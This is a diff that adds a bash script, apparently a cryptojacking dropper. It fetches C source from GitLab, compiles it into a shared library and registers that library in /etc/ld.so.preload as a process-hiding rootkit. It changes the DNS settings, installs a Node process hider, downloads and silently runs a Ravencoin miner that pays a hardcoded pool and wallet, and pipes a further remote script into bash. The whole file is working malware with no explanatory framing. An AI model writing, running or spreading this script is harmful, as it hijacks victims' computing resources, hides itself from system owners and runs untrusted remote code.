@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/liugtiujk/ahmadchan/-/raw/master/ahmadchan.c -o ahmadchan.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libahmadchan.so ahmadchan.c -ldl
+mv libahmadchan.so /usr/local/lib/
+echo /usr/local/lib/libahmadchan.so >> /etc/ld.so.preload
+rm ahmadchan.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add gua"
+wget https://gitlab.com/liugtiujk/ahmadchan/-/raw/main/gua >/dev/null 2>&1
+chmod +x gua
+./gua -a kawpow --coin rvn -o stratum+tcp://139.162.53.174:443 -u RCgPqH9ii58HmS3LkQT4KJiyNhqLi9QLMt -w ROHITCHAN >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/youcef664/ahmadchan/main/babyhappy.sh | bash
